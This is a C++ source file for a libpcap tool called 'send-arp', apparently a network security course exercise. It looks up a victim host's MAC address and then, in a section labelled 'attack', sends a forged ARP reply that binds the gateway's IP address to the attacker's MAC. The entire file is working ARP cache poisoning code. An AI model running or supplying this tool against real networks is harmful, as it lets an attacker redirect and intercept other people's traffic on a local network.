#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void find_My_IP_Mac_Address(char* my_ip[], u_char* mac_address, char* my_mac);
void packetMakeFunction(EthArpPacket* packet, char* e_dmac, char* e_smac, char* a_smac, char* a_sip, char* a_tmac, char* a_tip);

typedef struct
{
    char* dev_;
} Param;

typedef struct
{
    char buf[18];
    char tha[6];
} Arp_H;

Param param = {
    .dev_ = NULL };

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}


bool parse(Param* param, int argc, char* argv[])
{
    if (argc != 4)
    {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

int main(int argc, char* argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char* your_ip = argv[2];
    char* gateway_ip = argv[3];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }


    /* find my ip address */
    char* my_ip;
    u_char mac_address[6];
    char my_mac[20];
    find_My_IP_Mac_Address(&my_ip, mac_address, my_mac);


    /* find your mac address */
    char your_mac[20];
    char broadcast[20] = "ff:ff:ff:ff:ff:ff";
    char unknownMac[20] = "00:00:00:00:00:00";

    EthArpPacket packet;
    packetMakeFunction(&packet, broadcast, my_mac, my_mac, my_ip, unknownMac, your_ip);
    packet.arp_.op_ = htons(ArpHdr::Request);

    //send packet to you
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    if (!parse(&param, argc, argv))
        return -1;

    //receive reply from you -> get your mac address
    handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        u_char sha[6];
        for (int i = 0; i < 6; i++) sha[i] = packet[14 + 8 + i];
        sprintf(your_mac, "%02x:%02x:%02x:%02x:%02x:%02x", sha[0], sha[1], sha[2], sha[3], sha[4], sha[5]);
        break;
    }


    /* print infos */
    printf("my_mac = %s\n", my_mac);
    printf("my_ip = %s\n", my_ip);
    printf("your_mac = %s\n", your_mac);


    /* attack */
    packetMakeFunction(&packet, your_mac, my_mac, my_mac, gateway_ip, your_mac, your_ip);
    packet.arp_.op_ = htons(ArpHdr::Reply);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    pcap_close(handle);
}

void find_My_IP_Mac_Address(char* my_ip[], u_char* mac_address, char* my_mac)
{
    /* find my ip address */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;

    //I want IP address attached to "enp0s3"
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    //get my ip
    *my_ip = inet_ntoa(((struct sockaddr_in*) & ifr.ifr_addr)->sin_addr);


    /* find my mac address */
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (!(ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);

    sprintf(my_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mac_address[0], mac_address[1], mac_address[2], mac_address[3], mac_address[4], mac_address[5]);
}


void packetMakeFunction(EthArpPacket* packet, char* e_dmac, char* e_smac, char* a_smac, char* a_sip, char* a_tmac, char* a_tip)
{
    packet->eth_.dmac_ = Mac(e_dmac);
    packet->eth_.smac_ = Mac(e_smac);
    packet->eth_.type_ = htons(EthHdr::Arp);

    packet->arp_.hrd_ = htons(ArpHdr::ETHER);
    packet->arp_.pro_ = htons(EthHdr::Ip4);
    packet->arp_.hln_ = Mac::SIZE;
    packet->arp_.pln_ = Ip::SIZE;
    //packet->arp_.op_ = htons(ArpHdr::Reply);
    packet->arp_.smac_ = Mac(a_smac);
    packet->arp_.sip_ = htonl(Ip(a_sip));
    packet->arp_.tmac_ = Mac(a_tmac);
    packet->arp_.tip_ = htonl(Ip(a_tip));
}
